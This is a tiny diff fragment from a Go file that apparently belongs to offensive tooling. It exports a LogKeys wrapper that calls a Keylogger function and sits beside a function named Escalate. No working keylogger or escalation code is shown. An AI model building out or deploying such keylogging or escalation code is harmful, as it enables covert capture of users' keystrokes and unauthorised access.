@@ -189,7 +189,7 @@ func Escalate() {
 	}
 }
 
-func logKeys(logLocal *string) {
+func LogKeys(logLocal *string) {
 	Keylogger(logLocal)
 }
 
